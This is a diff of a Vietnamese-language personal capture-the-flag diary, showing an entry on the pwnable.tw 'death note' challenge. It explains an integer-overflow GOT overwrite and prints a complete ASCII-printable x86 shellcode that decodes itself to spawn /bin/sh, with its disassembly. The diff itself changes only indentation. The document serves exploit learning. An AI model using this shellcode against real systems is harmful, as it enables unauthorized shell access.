@@ -128,30 +128,31 @@ Nay làm mấy bài pwn mà chưa xong bài nào :(( Sad
 # Ngày 17  
  - [**death note**](https://pwnable.tw/static/chall/death_note)  
  Lúc đầu mình cứ tưởng bài này có malloc chắc lại heap rồi. Nhưng nghiên cứu 1 số lỗi cơ bản mình đã biết thì đéo có cái nào tận dụng được cả. Mình mới xem xét lại thì có lỗi tràn biến nguyên :v Cái này cũng khá là hay gặp nếu không filter cẩn thận. Lúc này ta có thể ghi đè lên got của bất kì hàm nào bằng địa chỉ của heap --> nơi đặt shellcode rồi thực thi. Nhưng có cái khó của bài này là ascii shellcode. Mình cũng chưa có kinh nghiệm nhiều với shellcode nên tham khảo wu :   
+
  ```python 
  \x68\x70\x70\x70\x70\x68\x70\x70\x70\x70\x59\x28\x48\x24\x28\x48\x2D\x28\x48\x2F\x28\x48\x31\x29\x48\x33\x28\x48\x37\x28\x48\x37\x68\x2F\x73\x68\x70\x68\x2F\x62\x69\x6E\x54\x5B\x31\x39\x31\x42\x31\x66\x31\x30\x21\x7C\x3D\x60
  ```  
    
- ```c
+  ```c
  0:  68 70 70 70 70          push   0x70707070
-5:  68 70 70 70 70          push   0x70707070
-a:  59                      pop    ecx
-b:  28 48 24                sub    BYTE PTR [eax+0x24],cl
-e:  28 48 2d                sub    BYTE PTR [eax+0x2d],cl
-11: 28 48 2f                sub    BYTE PTR [eax+0x2f],cl
-14: 28 48 31                sub    BYTE PTR [eax+0x31],cl
-17: 29 48 33                sub    DWORD PTR [eax+0x33],ecx
-1a: 28 48 37                sub    BYTE PTR [eax+0x37],cl
-1d: 28 48 37                sub    BYTE PTR [eax+0x37],cl
-20: 68 2f 73 68 70          push   0x7068732f
-25: 68 2f 62 69 6e          push   0x6e69622f
-2a: 54                      push   esp
-2b: 5b                      pop    ebx
-2c: 31 39                   xor    DWORD PTR [ecx],edi
-2e: 31 42 31                xor    DWORD PTR [edx+0x31],eax
-31: 66 31 30                xor    WORD PTR [eax],si
-34: 21 7c 3d 60             and    DWORD PTR [ebp+edi*1+0x60],edi
- ```
+ 5:  68 70 70 70 70          push   0x70707070
+ a:  59                      pop    ecx
+ b:  28 48 24                sub    BYTE PTR [eax+0x24],cl
+ e:  28 48 2d                sub    BYTE PTR [eax+0x2d],cl
+ 11: 28 48 2f                sub    BYTE PTR [eax+0x2f],cl
+ 14: 28 48 31                sub    BYTE PTR [eax+0x31],cl
+ 17: 29 48 33                sub    DWORD PTR [eax+0x33],ecx
+ 1a: 28 48 37                sub    BYTE PTR [eax+0x37],cl
+ 1d: 28 48 37                sub    BYTE PTR [eax+0x37],cl
+ 20: 68 2f 73 68 70          push   0x7068732f
+ 25: 68 2f 62 69 6e          push   0x6e69622f
+ 2a: 54                      push   esp
+ 2b: 5b                      pop    ebx
+ 2c: 31 39                   xor    DWORD PTR [ecx],edi
+ 2e: 31 42 31                xor    DWORD PTR [edx+0x31],eax
+ 31: 66 31 30                xor    WORD PTR [eax],si
+ 34: 21 7c 3d 60             and    DWORD PTR [ebp+edi*1+0x60],edi
+  ```
  Shellcode này dùng được khi eax là địa chỉ của shellcode. Từ đó nó sẽ giải mà đoạn code đằng sau để có hàm gọi shell. Magic vch :v  
 # Kết thúc  
 Tu tiên đại đạo gian nan, mong một ngày có thể quát tháo tiên giới :v  
